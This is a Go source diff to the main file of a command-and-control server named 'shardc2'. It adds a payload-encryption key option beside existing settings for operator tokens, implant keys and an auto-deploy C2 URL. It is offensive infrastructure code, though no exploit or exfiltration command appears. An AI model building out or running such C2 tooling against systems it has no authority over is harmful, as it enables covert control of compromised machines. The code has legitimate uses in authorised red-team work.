@@ -11,6 +11,7 @@ import (
 	"github.com/shardc2/shardc2/internal/database"
 	"github.com/shardc2/shardc2/internal/server"
 	"github.com/shardc2/shardc2/internal/server/middleware"
+	"github.com/shardc2/shardc2/pkg/crypto"
 )
 
 const banner = `
@@ -31,6 +32,7 @@ func main() {
 		operatorToken = flag.String("operator-token", os.Getenv("SHARDC2_OPERATOR_TOKEN"), "Operator authentication token")
 		implantKey    = flag.String("implant-key", os.Getenv("SHARDC2_IMPLANT_KEY"), "Agent implant authentication key")
 		c2URL         = flag.String("c2-url", os.Getenv("SHARDC2_C2_URL"), "External C2 URL for agent auto-deployment (e.g. http://10.0.0.5:8443)")
+		payloadKey    = flag.String("payload-key", os.Getenv("SHARDC2_PAYLOAD_KEY"), "Payload encryption key (hex, 32 bytes)")
 		tlsCert       = flag.String("tls-cert", "", "TLS certificate file")
 		tlsKey        = flag.String("tls-key", "", "TLS private key file")
 		generateCert  = flag.Bool("generate-cert", false, "Generate self-signed TLS certificate and exit")
@@ -86,9 +88,20 @@ func main() {
 		fmt.Printf("[+] C2 URL for auto-deploy: %s\n", *c2URL)
 	}
 
+	var payloadKeyBytes []byte
+	if *payloadKey != "" {
+		var err error
+		payloadKeyBytes, err = crypto.ParseHexKey(*payloadKey)
+		if err != nil {
+			payloadKeyBytes = crypto.DeriveKey(*payloadKey)
+		}
+		fmt.Println("[+] Payload encryption enabled")
+	}
+
 	cfg := server.ServerConfig{
 		OperatorToken: *operatorToken,
 		ImplantKey:    *implantKey,
+		PayloadKey:    payloadKeyBytes,
 		C2URL:         *c2URL,
 	}
 	srv := server.New(db, cfg)
